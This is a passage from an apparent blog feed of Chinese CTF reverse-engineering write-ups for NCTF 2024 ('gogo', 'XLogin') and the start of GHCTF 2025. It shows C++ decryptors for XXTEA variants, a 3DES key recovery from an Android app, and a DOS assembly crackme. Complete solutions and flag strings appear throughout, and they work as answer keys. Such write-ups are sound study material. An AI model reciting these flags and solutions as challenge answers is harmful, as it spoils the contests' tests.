class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b1 = (v11 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b2 = (v11 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b3 = v11 &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint32_t</span> le = (b3 &lt;&lt; <span class="number">24</span>) | (b2 &lt;&lt; <span class="number">16</span>) | (b1 &lt;&lt; <span class="number">8</span>) | b0;</span><br><span class="line">        <span class="built_in">memcpy</span>(plaintext + <span class="number">4</span> * i, &amp;le, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_safe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> key[] = <span class="string">&quot;NCTF24nctfNCTF24&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x97</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x12</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0xEB</span>, <span class="number">0xA0</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x5B</span>, <span class="number">0xA6</span>, <span class="number">0x2A</span>, <span class="number">0xA8</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xC9</span>, <span class="number">0x01</span>, <span class="number">0xF9</span>, <span class="number">0x36</span>, <span class="number">0x7B</span>, <span class="number">0x46</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(enc, key, flag);</span><br><span class="line">    <span class="built_in">decrypt</span>(enc<span class="number">+16</span>, key, flag<span class="number">+16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NCTF&#123;%.32s&#125;\n&quot;</span>, flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;58cb925e0cd823c0d0b54fd06b820b7e&#125;</code></p><h2 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p><p><img src="/2025/03/24/NCTF2024/image-15.png" alt="alt text"></p><p>在main_main函数附近有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用VM函数计算。这边一系列计算函数也印证想法。</p><p><img src="/2025/03/24/NCTF2024/image-16.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-17.png" alt="alt text"></p><p>对每个vm的函数都下断点输出执行的指令以及操作数，方便分析整个加密流程，如main_XOR函数断点：</p><p><img src="/2025/03/24/NCTF2024/image-18.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-19.png" alt="alt text"></p><p>运行输入38个’1’（数据简单方便分析算法），可以得到一堆我们输出的伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p><p>31313131就是我们输入的字符串的字节，不过是以4字节为单位进行运算。</p><p>通过分析可得知是将输入的flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p><p><img src="/2025/03/24/NCTF2024/image-20.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-21.png" alt="alt text"></p><p>可以根据伪代码计算流程进行还原成代码，基于标准XXTEA进行编写，中间可以对比标准算法发现异或Key的值在哪，以及根据加密计算的一些中间值来验证加密代码，最终加密值就可以根据伪代码尾部最终值来验证。（这边不具体赘述）</p><p><img src="/2025/03/24/NCTF2024/image-23.png" alt="alt text"></p><p>还原加密代码如下，基于标准XXTEA进行修改的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        sum += DELTA;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; <span class="number">5</span>; p++)</span><br><span class="line">        &#123;</span><br><span class="line">            y = v[(p + <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line">            z = v[p] += MX2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-22.png" alt="alt text"></p><h3 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key2[]&#123; <span class="number">0x32303234</span>, <span class="number">0xd6eb12c3</span>, <span class="number">0x9f1cf72e</span>, <span class="number">0x4e435446</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt1</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>]; </span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p<span class="number">-1</span>)%<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea_decrypt2</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> rounds, e;</span><br><span class="line">    rounds = <span class="number">16</span>;</span><br><span class="line">    sum = DELTA * rounds;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> p = <span class="number">5</span> - <span class="number">1</span>; p &gt;= <span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">0</span>)</span><br><span class="line">                z = v[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                z = v[(p - <span class="number">1</span>) % <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="number">4</span>)</span><br><span class="line">                y = v[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            v[p] -= MX2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc1[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0x5D</span>, <span class="number">0x45</span>, <span class="number">0xD5</span>, <span class="number">0xB9</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0x3B</span>, <span class="number">0xB1</span>,</span><br><span class="line">      <span class="number">0x3E</span>, <span class="number">0x1E</span>, <span class="number">0x5F</span>, <span class="number">0xC8</span>, <span class="number">0xE8</span>, <span class="number">0xBB</span>, <span class="number">0x64</span>, <span class="number">0x38</span>, <span class="number">0x48</span>, <span class="number">0x69</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc2[] =</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="number">0xDE</span>, <span class="number">0x81</span>, <span class="number">0xD8</span>, <span class="number">0xAD</span>, <span class="number">0xC2</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x32</span>, <span class="number">0x1C</span>, <span class="number">0xAB</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0x3E</span>, <span class="number">0xCB</span>, <span class="number">0xFF</span>, <span class="number">0xEF</span>, <span class="number">0xF1</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x7A</span>, <span class="number">0x16</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea_decrypt1</span>((<span class="type">uint32_t</span>*)enc1, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">xxtea_decrypt2</span>((<span class="type">uint32_t</span>*)enc2, <span class="number">5</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.20s%.20s\n&quot;</span>, enc1,enc2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;H4rd_VM_with_Gor0ut1n3_5fc4b0be7ad&#125;</code></p><h2 id="XLogin"><a href="#XLogin" class="headerlink" title="XLogin"></a>XLogin</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>jadx加载发现代码中调用了Decstr函数来解密一些字符串，可以在libsimple.so里面找到DecStr函数实现。</p><p>具体解密字符串函数就是Base64换表解密后再异或上当前字符串长度值。</p><p><img src="/2025/03/24/NCTF2024/image-24.png" alt="alt text"></p><p>就可以解密得到这些实际字符串。</p><p><img src="/2025/03/24/NCTF2024/image-25.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-26.png" alt="alt text"></p><p>发现doCheck是在native里面，ida分析libnative.so，发现有个loadDex，应该是动态加载一个dex。</p><p><img src="/2025/03/24/NCTF2024/image-27.png" alt="alt text"></p><p>在loadDex下面就是doCheck函数实际实现。</p><p><img src="/2025/03/24/NCTF2024/image-28.png" alt="alt text"></p><p>通过特征可以发现是使用了3des加密，先猜测他没有魔改，毕竟那一坨代码没人想看。上面的ptr的两个数据（xmmword_1804和unk_1814共24字节数据）就是被加密的flag，3des加密后下面的while循环就是对加密后的数据与flag密文进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-29.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-30.png" alt="alt text"></p><p>在apk的Assets里面会发现又有个libsimple.so，ida分析没有东西，直接拖入010发现存在一个dex结构头，前面的这64字节应该是没用的。</p><p><img src="/2025/03/24/NCTF2024/image-31.png" alt="alt text"></p><p>libnative.so里面loadDex跟到的函数验证了这个猜想，v13是Assets里的libsimple.so文件大小，减去了64，然后下面v17是读取起始指针，也加上了64，说明读取实际文件跳过了前64字节。</p><p><img src="/2025/03/24/NCTF2024/image-32.png" alt="alt text"></p><p>把前64字节去除，使用jadx分析。发现是Check函数，检测了username和password，和题目描述flag格式对应。username这边可以直接解密出来是<code>X1c@dM1n1$t</code>，然后使用username的MD5值作为密钥去调用doCheck加密。</p><p><img src="/2025/03/24/NCTF2024/image-33.png" alt="alt text"></p><p>密钥：<code>7d53ecd36a43d3d237e7dd633dcf8497</code></p><p>然后提取密文进行3des解密即可，然后这边有个端序问题卡了不少师傅一段时间，密文以及密钥都要以8字节位一组转换到大端序，才能解密，然后解密完的明文也要从大端序转回到小端序。</p><h3 id="解密-3"><a href="#解密-3" class="headerlink" title="解密"></a>解密</h3><p><img src="/2025/03/24/NCTF2024/image-34.png" alt="alt text"></p><p>解密完将明文以8字节一组倒序得到明文<code>SafePWD~5y$x?YM+5U05Gm6=</code></p><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;X1c@dM1n1$t_SafePWD~5y$x?YM+5U05Gm6=&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NCTF-2024-Reverse-WP&quot;&gt;&lt;a href=&quot;#NCTF-2024-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;NCTF 2024 Reverse WP&quot;&gt;&lt;/a&gt;NCTF 2024 Reverse WP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GHCTF2025WP</title>
    <link href="https://tkazer.github.io/2025/03/06/GHCTF2025WP/"/>
    <id>https://tkazer.github.io/2025/03/06/GHCTF2025WP/</id>
    <published>2025-03-06T02:37:20.000Z</published>
    <updated>2025-03-24T11:15:54.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GHCTF-2025-Reverse-WP"><a href="#GHCTF-2025-Reverse-WP" class="headerlink" title="GHCTF 2025 Reverse WP"></a>GHCTF 2025 Reverse WP</h1><p>这次也是第一次给CTF比赛出题，经验不足，完全是凭借之前打比赛做的题的经验来出的，难度尽可能把控住梯度上升，但是可能还是没做的那么好，各位师傅见谅了，如果有什么建议也可以联系我。</p><h2 id="ASN-Signin"><a href="#ASN-Signin" class="headerlink" title="ASN?Signin!"></a>ASN?Signin!</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这题估计大伙都AI一把梭了（），不过还是讲讲asm代码分析流程。</p><p>asm代码开头是数据段，存放着DATA1和DATA2，这两段就是关键数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.DATA</span><br><span class="line">    WELCOME_MSG db &#x27;Welcome to GHCTF!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    INPUT_MSG db &#x27;Input your flag:&#x27;, &#x27;$&#x27;</span><br><span class="line"></span><br><span class="line">    WRONG_MSG db 0DH, 0AH, &#x27;Wrong!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    RIGHT_MSG db 0DH, 0AH, &#x27;Right!&#x27;, 0DH, 0AH, &#x27;$&#x27;</span><br><span class="line">    </span><br><span class="line">    DATA1 DB 26H,27H,24H,25H,2AH,2BH,28H,00H</span><br><span class="line">            DB 2EH,2FH,2CH,2DH,32H,33H,30H,00H</span><br><span class="line">            DB 36H,37H,34H,35H,3AH,3BH,38H,39H</span><br><span class="line">            DB 3EH,3FH,3CH,3DH,3FH,27H,34H,11H</span><br><span class="line">    </span><br><span class="line">    DATA2 DB 69H,77H,77H,66H,73H,72H,4FH,46H</span><br><span class="line">            DB 03H,47H,6FH,79H,07H,41H,13H,47H</span><br><span class="line">            DB 5EH,67H,5FH,09H,0FH,58H,63H,7DH</span><br><span class="line">            DB 5FH,77H,68H,35H,62H,0DH,0DH,50H</span><br><span class="line">    </span><br><span class="line">    BUFFER1 db 33 dup(0)</span><br><span class="line">    BUFFER2 db 33 dup(0)</span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure><p>下面这部分就是程序启动时执行代码，读入33字节到BUFFER1中，然后CALL DO1函数，再CALL ENC函数，最后LOOP1进行比对跳转到结果输出。所以可知DATA2就是加密后的Flag数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">START:</span><br><span class="line">    MOV AX,@DATA</span><br><span class="line">    MOV DS,AX</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    MOV DX,OFFSET WELCOME_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV DX,OFFSET INPUT_MSG</span><br><span class="line">    INT 21H</span><br><span class="line">    MOV AH,0AH</span><br><span class="line">    MOV DX,OFFSET BUFFER1</span><br><span class="line">    MOV BYTE PTR[BUFFER1],33    ; 读入33字节到BUFFER1</span><br><span class="line">    INT 21H</span><br><span class="line">    CALL DO1                    ; Call DO1</span><br><span class="line">    CALL ENC                    ; Call ENC</span><br><span class="line">    MOV SI,OFFSET BUFFER1 + 2</span><br><span class="line">    MOV DI,OFFSET DATA2</span><br><span class="line">    MOV CX,32</span><br><span class="line">LOOP1:                          ; 比对DATA2和加密后的数据</span><br><span class="line">    MOV AL,[SI]</span><br><span class="line">    CMP AL,[DI]</span><br><span class="line">    JNE P2</span><br><span class="line">    INC SI</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP1</span><br><span class="line">P1:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,RIGHT_MSG            ; 输出正确信息</span><br><span class="line">    INT 21H</span><br><span class="line">    JMP EXIT_PROGRAM</span><br><span class="line">P2:</span><br><span class="line">    MOV AH,09H</span><br><span class="line">    LEA DX,WRONG_MSG            ; 输出错误信息</span><br><span class="line">    INT 21H</span><br></pre></td></tr></table></figure><p>以下是DO1函数和DO2函数代码，可以看到是针对DATA1进行的一些操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">DO1 PROC</span><br><span class="line">    PUSH SI</span><br><span class="line">    PUSH DI</span><br><span class="line">    PUSH CX</span><br><span class="line">    XOR SI,SI</span><br><span class="line">    MOV CX,8</span><br><span class="line">SWAP_LOOP:</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV DI,SI</span><br><span class="line">    ADD DI,4</span><br><span class="line">    CMP DI,28</span><br><span class="line">    JL NOWRAP</span><br><span class="line">    SUB DI,28</span><br><span class="line">NOWRAP:</span><br><span class="line">    MOV BX,SI</span><br><span class="line">    CALL DO2</span><br><span class="line">    ADD SI,4</span><br><span class="line">    POP CX</span><br><span class="line">    LOOP SWAP_LOOP</span><br><span class="line">    POP CX</span><br><span class="line">    POP DI</span><br><span class="line">    POP SI</span><br><span class="line">    RET</span><br><span class="line">DO1 ENDP</span><br><span class="line"></span><br><span class="line">DO2 PROC</span><br><span class="line">    PUSH CX</span><br><span class="line">    MOV CX,4</span><br><span class="line">LOOP3:</span><br><span class="line">    MOV AL,DATA1[BX]</span><br><span class="line">    MOV AH,DATA1[DI]</span><br><span class="line">    MOV DATA1[BX],AH</span><br><span class="line">    MOV DATA1[DI],AL</span><br><span class="line">    INC BX</span><br><span class="line">    INC DI</span><br><span class="line">    LOOP LOOP3</span><br><span class="line">    POP CX</span><br><span class="line">    RET</span><br><span class="line">DO2 ENDP</span><br></pre></td></tr></table></figure><p>下面这部分是ENC函数代码，是利用DO1后的DATA1数据与输入的字符进行XOR操作，注意到xor操作都是在WORD，也就是二字节的基础上进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 